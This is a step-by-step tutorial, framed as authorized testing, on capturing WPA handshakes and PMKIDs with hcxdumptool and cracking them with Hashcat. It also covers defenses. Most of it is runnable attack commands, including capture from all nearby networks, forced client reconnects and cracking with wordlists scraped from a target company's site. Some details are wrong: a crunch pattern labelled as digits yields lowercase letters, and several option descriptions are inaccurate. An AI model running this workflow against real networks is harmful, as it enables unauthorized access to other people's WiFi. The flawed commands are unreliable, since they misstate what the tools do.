# Complete Guide to WiFi Password Security Testing
## Using hcxdumptool, hcxtools, and Hashcat

---

## ⚠️ LEGAL DISCLAIMER

**READ THIS CAREFULLY BEFORE PROCEEDING**

This guide is intended for:
- **Authorized penetration testing** on networks you own or have explicit written permission to test
- **Educational purposes** in controlled lab environments
- **Security research** on your own equipment
- **CTF competitions** and authorized security challenges

**ILLEGAL ACTIVITIES:**
- Accessing networks without authorization is **ILLEGAL** in most jurisdictions
- Violates: Computer Fraud and Abuse Act (CFAA), Computer Misuse Act, and similar laws worldwide
- Penalties include fines, imprisonment, and criminal records

**BY USING THESE TOOLS, YOU AGREE:**
- You have explicit authorization to test the target network
- You accept full legal responsibility for your actions
- The author assumes no liability for misuse

---

## Table of Contents

1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Installation](#installation)
4. [Wireless Adapter Requirements](#wireless-adapter-requirements)
5. [Step-by-Step Workflow](#step-by-step-workflow)
6. [hcxdumptool Usage](#hcxdumptool-usage)
7. [hcxtools Conversion](#hcxtools-conversion)
8. [Hashcat Password Cracking](#hashcat-password-cracking)
9. [Advanced Techniques](#advanced-techniques)
10. [Troubleshooting](#troubleshooting)
11. [Defense and Mitigation](#defense-and-mitigation)

---

## Overview

### What is hcxdumptool?

**hcxdumptool** is a small tool to capture packets from WLAN devices. It's designed specifically for capturing WPA/WPA2/WPA3 handshakes and PMKID hashes, which can then be used for security auditing.

### The Complete Toolchain

1. **hcxdumptool** - Captures packets and handshakes from WiFi networks
2. **hcxtools** - Converts capture files to formats usable by password crackers
3. **Hashcat** - Performs the actual password recovery/cracking
4. **aircrack-ng** (optional) - Alternative capture and cracking suite

### Attack Types Covered

- **PMKID Attack** - Captures PMKID from access points (no clients needed)
- **WPA/WPA2 Handshake Capture** - Traditional 4-way handshake capture
- **WPA3 Transition Mode** - Attacking WPA3 networks in transition mode
- **Deauthentication** - Forcing clients to reconnect to capture handshakes

---

## Prerequisites

### Hardware Requirements

- **Wireless adapter with monitor mode support**
- USB WiFi adapter recommended (internal cards often don't support required features)
- Sufficient CPU/GPU for password cracking (GPU highly recommended)

### Operating System

- Linux (Kali Linux, Ubuntu, Arch Linux, etc.)
- Root/sudo access required

### Knowledge Requirements

- Basic Linux command line
- Understanding of WiFi protocols (WPA2/WPA3)
- Networking fundamentals
- Bash scripting (helpful but not required)

---

## Installation

### Installing hcxdumptool

#### Method 1: From Package Manager (Debian/Ubuntu/Kali)

```bash
# Update package lists
sudo apt update

# Install hcxdumptool
sudo apt install hcxdumptool -y

# Verify installation
hcxdumptool --version
```

#### Method 2: Compile from Source

```bash
# Install dependencies
sudo apt install libcurl4-openssl-dev libssl-dev pkg-config

# Clone repository
git clone https://github.com/ZerBea/hcxdumptool.git
cd hcxdumptool

# Compile
make

# Install
sudo make install

# Verify
hcxdumptool --version
```

### Installing hcxtools

#### From Package Manager

```bash
# Install hcxtools
sudo apt install hcxtools -y

# Verify installation
hcxpcapngtool --version
hcxhashtool --version
```

#### Compile from Source

```bash
# Install dependencies
sudo apt install libcurl4-openssl-dev libssl-dev zlib1g-dev

# Clone repository
git clone https://github.com/ZerBea/hcxtools.git
cd hcxtools

# Compile
make

# Install
sudo make install
```

### Installing Hashcat

#### From Package Manager

```bash
# Install hashcat
sudo apt install hashcat -y

# Verify installation
hashcat --version
```

#### Installing Latest Version from Source

```bash
# Install dependencies
sudo apt install git build-essential

# Clone repository
git clone https://github.com/hashcat/hashcat.git
cd hashcat

# Compile
make

# Install
sudo make install

# Verify
hashcat --version
```

### Optional: Install aircrack-ng Suite

```bash
# Useful for additional tools and verification
sudo apt install aircrack-ng -y
```

---

## Wireless Adapter Requirements

### Supported Chipsets

Not all wireless adapters support monitor mode and packet injection. Recommended chipsets:

- **Realtek RTL8812AU** - Excellent support
- **Atheros AR9271** - Very well supported
- **Ralink RT3070** - Good compatibility
- **Realtek RTL8814AU** - Dual-band support

### Recommended Adapters

- **ALFA AWUS036ACH** (Realtek RTL8812AU)
- **ALFA AWUS036NHA** (Atheros AR9271)
- **TP-Link TL-WN722N v1** (Atheros AR9271) - *Note: v2 and v3 not supported*
- **Panda PAU09** (Ralink RT5572)

### Testing Your Adapter

```bash
# Check if adapter is detected
iwconfig

# Expected output should show wireless interface (e.g., wlan0, wlan1)

# Test monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify monitor mode
iwconfig
# Should show "Mode:Monitor"

# Check for packet injection support
sudo aireplay-ng --test wlan0
```

---

## Step-by-Step Workflow

### Complete Attack Flow

```
┌─────────────────────────────────────┐
│  1. Preparation                     │
│     - Enable monitor mode           │
│     - Identify target network       │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│  2. Capture Phase                   │
│     - Run hcxdumptool               │
│     - Capture handshakes/PMKIDs     │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│  3. Conversion Phase                │
│     - Convert with hcxpcapngtool    │
│     - Create hashcat-compatible hash│
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│  4. Cracking Phase                  │
│     - Run hashcat                   │
│     - Attempt password recovery     │
└──────────────┬──────────────────────┘
               │
┌──────────────▼──────────────────────┐
│  5. Results                         │
│     - Analyze findings              │
│     - Document vulnerabilities      │
└─────────────────────────────────────┘
```

---

## hcxdumptool Usage

### Step 1: Enable Monitor Mode

```bash
# Identify your wireless interface
iwconfig

# Assume interface is wlan0
# Kill processes that might interfere
sudo airmon-ng check kill
# Or manually:
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# Set interface down
sudo ip link set wlan0 down

# Enable monitor mode
sudo iw dev wlan0 set type monitor

# Bring interface up
sudo ip link set wlan0 up

# Verify monitor mode is enabled
iwconfig wlan0
```

### Step 2: Basic Capture

```bash
# Basic capture command
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=1

# Breakdown:
# -i wlan0              : Interface to use
# -o capture.pcapng     : Output file
# --enable_status=1     : Show status messages
```

### Step 3: Advanced Capture with All Features

```bash
# Full-featured capture
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=15 \
  --filterlist=filter.txt --filtermode=2

# Breakdown:
# --enable_status=15    : Enable all status messages (1+2+4+8)
#                         1 = EAPOL messages
#                         2 = PMKID
#                         4 = PROBEREQUEST/PROBERESPONSE
#                         8 = BEACON/ASSOCIATION
# --filterlist=filter.txt : File with MAC addresses to target
# --filtermode=2        : Use filter as whitelist (only target these)
```

### Step 4: Targeted Capture

Create a filter file with target MAC addresses:

```bash
# Create filter file
cat > filter.txt << EOF
AA:BB:CC:DD:EE:FF
11:22:33:44:55:66
EOF

# Run targeted capture
sudo hcxdumptool -i wlan0 -o targeted.pcapng \
  --enable_status=15 \
  --filterlist=filter.txt \
  --filtermode=2
```

### Step 5: Active Attack Mode

```bash
# Capture with active deauthentication
sudo hcxdumptool -i wlan0 -o active_capture.pcapng \
  --enable_status=15 \
  --active_beacon \
  --tot=60

# Breakdown:
# --active_beacon       : Send beacon frames
# --tot=60              : Timeout after 60 seconds
```

### Understanding hcxdumptool Output

```
[13:45:22] wlan0 (RSSID: 12345678)
[FOUND PMKID] SSID: TargetNetwork | MAC: AA:BB:CC:DD:EE:FF
[EAPOL M1] CLIENT: 11:22:33:44:55:66 | AP: AA:BB:CC:DD:EE:FF
[EAPOL M2] CLIENT: 11:22:33:44:55:66 | AP: AA:BB:CC:DD:EE:FF
[EAPOL M3] CLIENT: 11:22:33:44:55:66 | AP: AA:BB:CC:DD:EE:FF
[EAPOL M4] CLIENT: 11:22:33:44:55:66 | AP: AA:BB:CC:DD:EE:FF
```

- **PMKID** - PMKID captured (can crack without handshake!)
- **EAPOL M1-M4** - 4-way handshake messages (need M1+M2 or M2+M3)

---

## hcxtools Conversion

### Converting PCAPNG to Hashcat Format

```bash
# Convert capture to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Breakdown:
# -o hash.hc22000       : Output file in hashcat 22000 format
# capture.pcapng        : Input capture file
```

### Detailed Conversion with Information

```bash
# Verbose conversion with stats
hcxpcapngtool -o hash.hc22000 capture.pcapng -E essidlist.txt

# Breakdown:
# -E essidlist.txt      : Export list of ESSIDs (network names)
```

### Viewing Conversion Statistics

The conversion will output information like:

```
summary capture file
--------------------
file name........................: capture.pcapng
file type........................: pcapng 1.0
file hardware information........: x86_64
file os information..............: Linux 5.15.0
file application information.....: hcxdumptool 6.2.7
network type.....................: DLT_IEEE802_11_RADIO (127)
endianness.......................: little endian
read errors......................: 0
packets inside...................: 15432
skipped packets..................: 0
packets with FCS.................: 0
beacons (total)..................: 1245
beacons (WPS info)...............: 23
probe requests...................: 3421
probe responses..................: 2156
association requests.............: 89
association responses............: 89
reassociation requests...........: 12
reassociation responses..........: 12
authentications (OPEN SYSTEM)....: 145
authentications (SHARED KEY).....: 0
EAPOL packets (total)............: 234
EAPOL packets (WPA2).............: 198
EAPOL packets (WPA3).............: 36
EAPOL M1 messages................: 45
EAPOL M2 messages................: 43
EAPOL M3 messages................: 41
EAPOL M4 messages................: 39
EAPOL pairs......................: 38
PMKID (total)....................: 17
PMKID (best).....................: 15

written to 22000 hash file.......: 53
```

### Filtering Specific Networks

```bash
# Extract only specific ESSID
hcxpcapngtool -o hash.hc22000 capture.pcapng --essid="TargetNetwork"

# Extract multiple ESSIDs
hcxpcapngtool -o hash.hc22000 capture.pcapng --essid="Network1,Network2"
```

### Working with PMKID Only

```bash
# Extract only PMKID hashes
hcxpcapngtool -o pmkid.hc22000 capture.pcapng --pmkid-only
```

---

## Hashcat Password Cracking

### Understanding Hash Modes

- **Mode 22000** - WPA/WPA2/WPA3 (PMKID and EAPOL)
- **Mode 22001** - WPA/WPA2/WPA3 (PMK recovery from PMKID)

### Basic Dictionary Attack

```bash
# Simple dictionary attack
hashcat -m 22000 hash.hc22000 wordlist.txt

# Breakdown:
# -m 22000              : Hash type (WPA/WPA2/WPA3)
# hash.hc22000          : Hash file
# wordlist.txt          : Password dictionary
```

### Dictionary Attack with Rules

```bash
# Attack with rules (password mutations)
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Breakdown:
# -r rules/best64.rule  : Apply rule file for mutations
```

### Combination Attack

```bash
# Combine two wordlists
hashcat -m 22000 hash.hc22000 -a 1 wordlist1.txt wordlist2.txt

# Breakdown:
# -a 1                  : Combination attack mode
```

### Mask Attack (Brute Force)

```bash
# Brute force 8-digit password
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d

# Breakdown:
# -a 3                  : Mask attack mode
# ?d                    : Digit (0-9)

# Common masks:
# ?l = lowercase (a-z)
# ?u = uppercase (A-Z)
# ?d = digit (0-9)
# ?s = special characters
# ?a = all characters

# Example: 8 characters, lowercase only
hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l

# Example: Password123 pattern (Password + 3 digits)
hashcat -m 22000 hash.hc22000 -a 3 Password?d?d?d
```

### Hybrid Attack

```bash
# Dictionary + mask (e.g., "password123")
hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d

# Breakdown:
# -a 6                  : Hybrid wordlist + mask
# ?d?d?d                : Append 3 digits to each word

# Reverse (mask + dictionary)
hashcat -m 22000 hash.hc22000 -a 7 ?d?d?d wordlist.txt
```

### GPU Acceleration

```bash
# Use specific GPU
hashcat -m 22000 hash.hc22000 wordlist.txt -d 1

# Use all GPUs
hashcat -m 22000 hash.hc22000 wordlist.txt -D 1,2

# Workload profile (1-4, higher = faster but less responsive system)
hashcat -m 22000 hash.hc22000 wordlist.txt -w 3

# Optimize for speed
hashcat -m 22000 hash.hc22000 wordlist.txt -O
```

### Session Management

```bash
# Start named session
hashcat -m 22000 hash.hc22000 wordlist.txt --session=mysession

# Pause: Press 'p' during execution

# Resume session
hashcat --session=mysession --restore

# Check status: Press 's' during execution
```

### Advanced Options

```bash
# Complete advanced attack
hashcat -m 22000 hash.hc22000 wordlist.txt \
  -r rules/best64.rule \
  -O \
  -w 3 \
  --session=advanced_attack \
  --status \
  --status-timer=10 \
  --hwmon-temp-abort=90

# Breakdown:
# -O                    : Optimize for speed (limits password length)
# -w 3                  : Workload profile (high)
# --status              : Auto-update status
# --status-timer=10     : Update every 10 seconds
# --hwmon-temp-abort=90 : Abort if GPU temp exceeds 90°C
```

### Showing Cracked Passwords

```bash
# Show cracked passwords
hashcat -m 22000 hash.hc22000 --show

# Output format:
# hash:ESSID:password
```

---

## Advanced Techniques

### Creating Custom Wordlists

#### Using crunch

```bash
# Install crunch
sudo apt install crunch

# Generate 8-character numeric passwords
crunch 8 8 0123456789 -o numbers8.txt

# Generate passwords with pattern (e.g., Password + 4 digits)
crunch 12 12 -t Password@@@@ -o custom.txt
# @ = lowercase, , = uppercase, % = numbers, ^ = symbols
```

#### Using cewl (Web scraping)

```bash
# Install cewl
sudo apt install cewl

# Scrape website for potential passwords
cewl https://target-company.com -d 2 -m 8 -w company_wordlist.txt

# Breakdown:
# -d 2                  : Depth of crawling
# -m 8                  : Minimum word length
# -w output.txt         : Output file
```

### Combining Multiple Wordlists

```bash
# Merge and remove duplicates
cat wordlist1.txt wordlist2.txt wordlist3.txt | sort -u > combined.txt

# Use with hashcat
hashcat -m 22000 hash.hc22000 combined.txt
```

### Rule-Based Attacks

```bash
# Common rule files in Hashcat
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/rockyou-30000.rule
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/d3ad0ne.rule

# Combine multiple rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule -r rules/toggles1.rule
```

### Creating Custom Rules

Create a file `custom.rule`:

```
# Capitalize first letter
c

# Append current year
$2$0$2$4

# Leetspeak
so0 si1 se3 sa4

# Combination
c so0 si1 $!
```

Use custom rule:

```bash
hashcat -m 22000 hash.hc22000 wordlist.txt -r custom.rule
```

### PMKID Attack Strategy

PMKID attacks are faster and don't require clients:

```bash
# 1. Capture PMKID only (faster)
sudo hcxdumptool -i wlan0 -o pmkid.pcapng --enable_status=2 --tot=120

# 2. Convert
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng --pmkid-only

# 3. Crack
hashcat -m 22000 pmkid.hc22000 rockyou.txt -O -w 3
```

### Monitoring Multiple Networks

```bash
# Capture from all nearby networks
sudo hcxdumptool -i wlan0 -o multi_capture.pcapng \
  --enable_status=15 \
  --tot=300 \
  --active_beacon

# Convert all
hcxpcapngtool -o all_hashes.hc22000 multi_capture.pcapng

# View extracted ESSIDs
hcxpcapngtool -o /dev/null multi_capture.pcapng -E essid_list.txt
cat essid_list.txt
```

---

## Troubleshooting

### Common Issues and Solutions

#### 1. No Handshakes Captured

**Problem:** Running for long time but no EAPOL messages

**Solutions:**
```bash
# Ensure monitor mode is active
iwconfig wlan0

# Check channel hopping
sudo hcxdumptool -i wlan0 -o test.pcapng --enable_status=15

# Try fixed channel (if you know target channel)
sudo iwconfig wlan0 channel 6
sudo hcxdumptool -i wlan0 -o test.pcapng --enable_status=15

# Use active mode to force deauth
sudo hcxdumptool -i wlan0 -o test.pcapng --enable_status=15 --active_beacon
```

#### 2. Interface Busy Error

**Problem:** `SIOCSIFFLAGS: Device or resource busy`

**Solution:**
```bash
# Kill interfering processes
sudo airmon-ng check kill

# Or manually
sudo systemctl stop NetworkManager
sudo killall wpa_supplicant
sudo killall dhclient

# Restart interface
sudo ip link set wlan0 down
sudo ip link set wlan0 up
```

#### 3. No PMKIDs Found

**Problem:** Router doesn't respond with PMKID

**Solution:**
- Not all routers support PMKID (mainly older or properly configured ones)
- Try traditional handshake capture instead
- Wait for client to connect naturally
- Use deauthentication to force reconnection

```bash
# Fall back to handshake capture
sudo hcxdumptool -i wlan0 -o handshake.pcapng --enable_status=1 --tot=600
```

#### 4. Hashcat Not Using GPU

**Problem:** Slow cracking speed, GPU not utilized

**Solutions:**
```bash
# List available devices
hashcat -I

# Use specific GPU
hashcat -m 22000 hash.hc22000 wordlist.txt -d 1

# Install GPU drivers
# For NVIDIA:
sudo apt install nvidia-driver nvidia-cuda-toolkit

# For AMD:
sudo apt install rocm-opencl-runtime

# Verify OpenCL
clinfo
```

#### 5. Conversion Produces No Hashes

**Problem:** `hcxpcapngtool` finds 0 hashes

**Solutions:**
```bash
# Check capture file integrity
hcxpcapngtool capture.pcapng

# Look for "EAPOL pairs" or "PMKID (best)"
# If 0, capture didn't contain valid data

# Verify capture during collection
# Look for [FOUND PMKID] or [EAPOL M1-M4] messages

# Try recapturing with more time
sudo hcxdumptool -i wlan0 -o new_capture.pcapng --enable_status=15 --tot=600
```

#### 6. Monitor Mode Not Supported

**Problem:** Adapter doesn't support monitor mode

**Solution:**
- Purchase a compatible USB WiFi adapter (see recommended adapters section)
- Verify chipset compatibility
- Install appropriate drivers

```bash
# Check current driver
lsusb
ethtool -i wlan0

# Search for driver
apt search rtl8812au
# Install if available
```

---

## Defense and Mitigation

### As a Network Administrator

#### Strong Password Policy

```bash
# Password requirements:
- Minimum 12 characters
- Mix of upper/lowercase, numbers, symbols
- No dictionary words
- No personal information
- Change default passwords immediately
```

#### Recommended WPA3 Configuration

- Migrate to WPA3-SAE (Simultaneous Authentication of Equals)
- Disable WPA3 transition mode
- Enable Protected Management Frames (PMF/802.11w)

#### Disable WPS

WPS is highly vulnerable:

```
Access router settings:
1. Navigate to Wireless Settings
2. Locate WPS section
3. Disable WPS
4. Save and reboot
```

#### Monitor for Attacks

```bash
# Install wireless IDS
sudo apt install kismet

# Run kismet to detect attacks
sudo kismet

# Look for:
- Deauthentication floods
- Unusual probe requests
- Rogue access points
```

#### Network Segmentation

- Separate guest network
- VLAN segmentation
- MAC filtering (limited effectiveness)
- 802.1X authentication for enterprise

#### Regular Security Audits

```bash
# Test your own network security
sudo hcxdumptool -i wlan0 -o audit.pcapng --enable_status=2 --tot=60
hcxpcapngtool -o audit.hc22000 audit.pcapng
hashcat -m 22000 audit.hc22000 common_passwords.txt

# If password is cracked, change it immediately
```

---

## Complete Example Walkthrough

### Scenario: Authorized Security Audit

You have written permission to test the security of network "CompanyWiFi"

#### Step 1: Preparation

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install required tools
sudo apt install hcxdumptool hcxtools hashcat -y

# Stop network manager
sudo systemctl stop NetworkManager

# Enable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
iwconfig wlan0
```

#### Step 2: Reconnaissance

```bash
# Quick scan to find target
sudo hcxdumptool -i wlan0 -o scan.pcapng --enable_status=12 --tot=30

# View networks
hcxpcapngtool scan.pcapng -E networks.txt
cat networks.txt

# Identify target MAC address (BSSID)
# Let's say: AA:BB:CC:DD:EE:FF
```

#### Step 3: Create Target Filter

```bash
# Create filter file
echo "AA:BB:CC:DD:EE:FF" > target.txt
```

#### Step 4: Capture PMKID/Handshake

```bash
# Attempt PMKID capture first (faster, no clients needed)
sudo hcxdumptool -i wlan0 -o company_capture.pcapng \
  --enable_status=15 \
  --filterlist=target.txt \
  --filtermode=2 \
  --tot=300

# Monitor output for:
# [FOUND PMKID] - Success, can proceed to cracking
# [EAPOL M1-M4] - Handshake captured
```

#### Step 5: Convert Capture

```bash
# Convert to hashcat format
hcxpcapngtool -o company.hc22000 company_capture.pcapng

# Verify hashes
cat company.hc22000

# Should see hash line with ESSID "CompanyWiFi"
```

#### Step 6: Prepare Wordlists

```bash
# Download rockyou wordlist (if not present)
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Or create custom wordlist
cewl https://company-website.com -d 2 -m 8 -w company_words.txt

# Combine wordlists
cat rockyou.txt company_words.txt | sort -u > combined.txt
```

#### Step 7: Crack Password

```bash
# Start with dictionary attack
hashcat -m 22000 company.hc22000 combined.txt --session=company_audit

# Add rules for variations
hashcat -m 22000 company.hc22000 combined.txt -r rules/best64.rule --session=company_audit

# Try hybrid attack (word + digits)
hashcat -m 22000 company.hc22000 -a 6 combined.txt ?d?d?d?d --session=company_audit

# Check progress (press 's' during execution)

# View cracked passwords
hashcat -m 22000 company.hc22000 --show
```

#### Step 8: Documentation

```bash
# Document findings
cat > audit_report.txt << EOF
WiFi Security Audit Report
==========================

Network: CompanyWiFi
BSSID: AA:BB:CC:DD:EE:FF
Date: $(date)

Findings:
- PMKID captured successfully in X minutes
- Password cracked: [REDACTED]
- Time to crack: Y minutes
- Attack method: Dictionary + rules

Recommendations:
1. Change password to minimum 16 characters
2. Use random generation, not dictionary words
3. Enable WPA3 if supported
4. Disable WPS
5. Implement password rotation policy

EOF
```

#### Step 9: Cleanup

```bash
# Disable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up

# Restart NetworkManager
sudo systemctl start NetworkManager

# Securely delete sensitive files
shred -vfz -n 10 company_capture.pcapng
shred -vfz -n 10 company.hc22000
```

---

## Useful Resources

### Wordlists

- **rockyou.txt** - Most popular, 14 million passwords
- **SecLists** - https://github.com/danielmiessler/SecLists
- **CrackStation** - https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm

### Rule Files

- **Hashcat rules** - /usr/share/hashcat/rules/
- **OneRuleToRuleThemAll** - https://github.com/NotSoSecure/password_cracking_rules
- **Hob0Rules** - https://github.com/praetorian-inc/Hob0Rules

### Tools

- **hcxdumptool** - https://github.com/ZerBea/hcxdumptool
- **hcxtools** - https://github.com/ZerBea/hcxtools
- **Hashcat** - https://hashcat.net/hashcat/
- **aircrack-ng** - https://www.aircrack-ng.org/

### Documentation

- **Hashcat Wiki** - https://hashcat.net/wiki/
- **WPA/WPA2 Cracking Guide** - https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2

---

## Quick Reference Commands

### Setup and Monitor Mode

```bash
# Enable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Disable monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type managed
sudo ip link set wlan0 up
```

### Capture

```bash
# Quick PMKID capture
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=2 --tot=120

# Full capture with all features
sudo hcxdumptool -i wlan0 -o capture.pcapng --enable_status=15 --active_beacon --tot=300
```

### Conversion

```bash
# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Convert specific ESSID
hcxpcapngtool -o hash.hc22000 capture.pcapng --essid="TargetNetwork"
```

### Cracking

```bash
# Dictionary attack
hashcat -m 22000 hash.hc22000 wordlist.txt

# Dictionary with rules
hashcat -m 22000 hash.hc22000 wordlist.txt -r rules/best64.rule

# Mask attack (8 lowercase)
hashcat -m 22000 hash.hc22000 -a 3 ?l?l?l?l?l?l?l?l

# Hybrid (word + 4 digits)
hashcat -m 22000 hash.hc22000 -a 6 wordlist.txt ?d?d?d?d

# Show cracked
hashcat -m 22000 hash.hc22000 --show
```

---

## Final Notes

### Responsible Disclosure

If you discover vulnerabilities during authorized testing:

1. Document findings thoroughly
2. Report to network owner/administrator
3. Provide remediation recommendations
4. Allow reasonable time for fixes
5. Do not publicly disclose without permission

### Continuing Education

- Practice in controlled lab environments
- Participate in CTF competitions
- Stay updated with latest security research
- Join security communities (ethically focused)

### Legal Resources

Before conducting any security testing:

- Obtain written authorization
- Review local laws (CFAA, Computer Misuse Act, etc.)
- Understand scope and limitations
- Consider professional liability insurance
- Consult legal counsel when in doubt

---

**Remember: With great power comes great responsibility. Use these tools ethically and legally.**

**Last Updated:** November 2024
**Version:** 1.0
**Author:** Security Educational Guide
**License:** Educational Use Only

---

